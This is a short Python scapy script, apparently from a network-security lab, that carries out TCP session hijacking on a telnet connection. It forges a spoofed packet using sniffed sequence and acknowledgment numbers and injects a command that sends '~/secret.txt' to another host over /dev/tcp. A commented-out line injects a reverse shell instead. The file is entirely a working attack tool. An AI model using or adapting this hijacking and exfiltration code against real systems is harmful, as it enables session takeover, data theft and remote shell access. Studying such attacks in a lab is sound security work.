#! /usr/bin/env python3

"""
Session Hijacking and Command Injection Attack
"""

from scapy.all import IP, TCP, send

# FIXME: set server IP address
SRC_IP = "10.9.0.5"
SRC_PORT = 23

# FIXME: set client IP address
DST_IP = "10.9.0.6"
# FIXME: set clien port
DST_PORT = 59776

# FIXME: set the sequence number
# seq from server to client from most recent packet in sniff_telnet.py output
SEQ_NUM = 2854662561
# FIXME: set acknowledgment number
# ack from server to client from most recent packet in sniff_telnet.py output
ACK_NUM = 516854581


def inject_command():
    ip = IP(src=DST_IP, dst=SRC_IP)
    tcp = TCP(sport=DST_PORT, dport=SRC_PORT,
              flags="A", seq=ACK_NUM, ack=SEQ_NUM)
    data = "\r cat ~/secret.txt > /dev/tcp/10.9.0.1/9090\r"
    # data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 2>&1 0<&1 \r"
    packet = ip / tcp / data
    print(packet.show())
    send(packet)


if __name__ == "__main__":
    inject_command()
    # Usage: python3 session_hijack.py
